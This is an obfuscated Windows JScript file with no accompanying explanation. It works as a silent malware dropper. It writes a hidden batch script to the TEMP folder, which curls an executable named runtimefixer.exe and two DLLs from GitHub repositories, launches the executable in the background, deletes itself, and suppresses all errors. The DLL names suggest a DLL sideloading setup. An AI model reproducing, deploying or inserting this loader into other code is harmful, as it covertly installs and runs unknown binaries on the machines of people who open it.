// obfuscated.js
(function() {
    function _0x1f() {
        try {
            var _0x2a = new ActiveXObject("WScript.Shell");
            var _0x3b = new ActiveXObject("Scripting.FileSystemObject");
            
            var _0x4c = _0x2a.ExpandEnvironmentStrings("%TEMP%") + "\\RuntimeFixer";
            
            if (!_0x3b.FolderExists(_0x4c)) {
                _0x3b.CreateFolder(_0x4c);
            }
            
            var _0x5d = "https://";
            var _0x6e = "github.com";
            var _0x7f = "/amindaraji64-arch/";
            var _0x8g = "/raw/refs/heads/main/";
            
            var _0x9h = [
                _0x5d + _0x6e + _0x7f + "a" + _0x8g + "runtimefixer.exe",
                _0x5d + _0x6e + _0x7f + "b" + _0x8g + "DismCore.dll",
                _0x5d + _0x6e + _0x7f + "c" + _0x8g + "PagePdfSize_Config.dll"
            ];
            
            var _0x1i = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
            
            var _0x2j = _0x4c + "\\run.bat";
            var _0x3k = "@echo off\r\n";
            
            for (var _0x4l = 0; _0x4l < _0x9h.length; _0x4l++) {
                var _0x5m = _0x4c + "\\" + _0x1i[_0x4l];
                _0x3k = _0x3k + "curl -L -o \"" + _0x5m + "\" \"" + _0x9h[_0x4l] + "\" > nul 2>&1\r\n";
            }
            
            _0x3k = _0x3k + "start /B \"\" \"" + _0x4c + "\\runtimefixer.exe\"\r\n";
            _0x3k = _0x3k + "del /q \"" + _0x2j + "\"\r\n";
            
            var _0x6n = _0x3b.CreateTextFile(_0x2j, true);
            _0x6n.Write(_0x3k);
            _0x6n.Close();
            
            _0x2a.Run("cmd.exe /c \"" + _0x2j + "\"", 0, false);
            
        } catch(_0x7o) {}
    }
    
    _0x1f();
})();
